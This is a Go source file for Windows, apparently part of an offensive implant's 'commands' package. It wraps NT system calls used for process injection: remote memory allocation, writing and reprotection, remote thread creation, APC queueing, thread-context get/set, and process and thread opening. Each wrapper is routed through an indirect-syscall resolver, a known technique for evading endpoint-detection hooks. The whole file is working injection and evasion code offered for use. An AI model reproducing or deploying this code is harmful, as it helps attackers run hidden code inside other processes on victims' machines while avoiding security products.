//go:build windows

package commands

import (
	"syscall"
	"unsafe"
)

// --- Nt* wrapper functions for injection commands ---

// IndirectNtAllocateVirtualMemory allocates memory in a process via indirect syscall.
// NTSTATUS NtAllocateVirtualMemory(ProcessHandle, *BaseAddress, ZeroBits, *RegionSize, AllocationType, Protect)
func IndirectNtAllocateVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, allocationType, protect uint32) uint32 {
	entry := indirectSyscallResolver.entries["NtAllocateVirtualMemory"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001 // STATUS_UNSUCCESSFUL
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		0, // ZeroBits
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(allocationType),
		uintptr(protect),
	)
	return uint32(r)
}

// IndirectNtWriteVirtualMemory writes memory in a process via indirect syscall.
// NTSTATUS NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferSize, *NumberOfBytesWritten)
func IndirectNtWriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize uintptr, bytesWritten *uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtWriteVirtualMemory"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		processHandle,
		baseAddress,
		buffer,
		bufferSize,
		uintptr(unsafe.Pointer(bytesWritten)),
	)
	return uint32(r)
}

// IndirectNtProtectVirtualMemory changes memory protection via indirect syscall.
// NTSTATUS NtProtectVirtualMemory(ProcessHandle, *BaseAddress, *RegionSize, NewProtect, *OldProtect)
func IndirectNtProtectVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, newProtect uint32, oldProtect *uint32) uint32 {
	entry := indirectSyscallResolver.entries["NtProtectVirtualMemory"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
	)
	return uint32(r)
}

// IndirectNtCreateThreadEx creates a thread in a process via indirect syscall.
// NTSTATUS NtCreateThreadEx(*ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
//
//	StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaxStackSize, AttributeList)
func IndirectNtCreateThreadEx(threadHandle *uintptr, processHandle, startRoutine uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtCreateThreadEx"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		uintptr(unsafe.Pointer(threadHandle)),
		0x1FFFFF, // THREAD_ALL_ACCESS
		0,        // ObjectAttributes
		processHandle,
		startRoutine,
		0, // Argument
		0, // CreateFlags
		0, // ZeroBits
		0, // StackSize
		0, // MaxStackSize
		0, // AttributeList
	)
	return uint32(r)
}

// IndirectNtCreateThreadExWithArg creates a thread in a process with a start argument via indirect syscall.
// Same as IndirectNtCreateThreadEx but passes an argument to the thread start routine.
func IndirectNtCreateThreadExWithArg(threadHandle *uintptr, processHandle, startRoutine, argument uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtCreateThreadEx"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		uintptr(unsafe.Pointer(threadHandle)),
		0x1FFFFF, // THREAD_ALL_ACCESS
		0,        // ObjectAttributes
		processHandle,
		startRoutine,
		argument, // Argument passed to start routine
		0,        // CreateFlags
		0,        // ZeroBits
		0,        // StackSize
		0,        // MaxStackSize
		0,        // AttributeList
	)
	return uint32(r)
}

// IndirectNtFreeVirtualMemory frees memory in a process via indirect syscall.
// NTSTATUS NtFreeVirtualMemory(ProcessHandle, *BaseAddress, *RegionSize, FreeType)
func IndirectNtFreeVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, freeType uint32) uint32 {
	entry := indirectSyscallResolver.entries["NtFreeVirtualMemory"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(freeType),
	)
	return uint32(r)
}

// IndirectNtOpenProcess opens a process handle via indirect syscall.
// NTSTATUS NtOpenProcess(*ProcessHandle, DesiredAccess, *OBJECT_ATTRIBUTES, *CLIENT_ID)
func IndirectNtOpenProcess(processHandle *uintptr, desiredAccess uint32, pid uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtOpenProcess"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}

	// CLIENT_ID: UniqueProcess (uintptr) + UniqueThread (uintptr)
	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}
	cid := clientID{UniqueProcess: pid}

	// OBJECT_ATTRIBUTES: Length(4) + pad(4) + RootDirectory(8) + ObjectName(8) + Attributes(4) + pad(4) + SecurityDescriptor(8) + SecurityQualityOfService(8)
	type objectAttributes struct {
		Length                   uint32
		_                        uint32
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		_                        uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}
	oa := objectAttributes{Length: uint32(unsafe.Sizeof(objectAttributes{}))}

	r, _, _ := syscall.SyscallN(entry.StubAddr,
		uintptr(unsafe.Pointer(processHandle)),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&cid)),
	)
	return uint32(r)
}

// IndirectNtResumeThread resumes a suspended thread via indirect syscall.
// NTSTATUS NtResumeThread(ThreadHandle, *PreviousSuspendCount)
func IndirectNtResumeThread(threadHandle uintptr, previousSuspendCount *uint32) uint32 {
	entry := indirectSyscallResolver.entries["NtResumeThread"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		threadHandle,
		uintptr(unsafe.Pointer(previousSuspendCount)),
	)
	return uint32(r)
}

// IndirectNtGetContextThread retrieves thread context via indirect syscall.
// NTSTATUS NtGetContextThread(ThreadHandle, *CONTEXT)
func IndirectNtGetContextThread(threadHandle uintptr, context uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtGetContextThread"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		threadHandle,
		context,
	)
	return uint32(r)
}

// IndirectNtSetContextThread sets thread context via indirect syscall.
// NTSTATUS NtSetContextThread(ThreadHandle, *CONTEXT)
func IndirectNtSetContextThread(threadHandle uintptr, context uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtSetContextThread"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		threadHandle,
		context,
	)
	return uint32(r)
}

// IndirectNtOpenThread opens a thread handle via indirect syscall.
// NTSTATUS NtOpenThread(*ThreadHandle, DesiredAccess, *OBJECT_ATTRIBUTES, *CLIENT_ID)
func IndirectNtOpenThread(threadHandle *uintptr, desiredAccess uint32, tid uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtOpenThread"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}

	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}
	cid := clientID{UniqueThread: tid}

	type objectAttributes struct {
		Length                   uint32
		_                        uint32
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		_                        uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}
	oa := objectAttributes{Length: uint32(unsafe.Sizeof(objectAttributes{}))}

	r, _, _ := syscall.SyscallN(entry.StubAddr,
		uintptr(unsafe.Pointer(threadHandle)),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&cid)),
	)
	return uint32(r)
}

// IndirectNtQueueApcThread queues an APC to a thread via indirect syscall.
// NTSTATUS NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3)
func IndirectNtQueueApcThread(threadHandle, apcRoutine, arg1, arg2, arg3 uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtQueueApcThread"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		threadHandle,
		apcRoutine,
		arg1,
		arg2,
		arg3,
	)
	return uint32(r)
}

// IndirectNtReadVirtualMemory reads memory from a remote process via indirect syscall.
// NTSTATUS NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesRead)
func IndirectNtReadVirtualMemory(processHandle, baseAddress, buffer, bufferSize uintptr, bytesRead *uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtReadVirtualMemory"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		processHandle,
		baseAddress,
		buffer,
		bufferSize,
		uintptr(unsafe.Pointer(bytesRead)),
	)
	return uint32(r)
}

// IndirectNtClose closes a handle via indirect syscall.
// NTSTATUS NtClose(Handle)
func IndirectNtClose(handle uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtClose"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr, handle)
	return uint32(r)
}
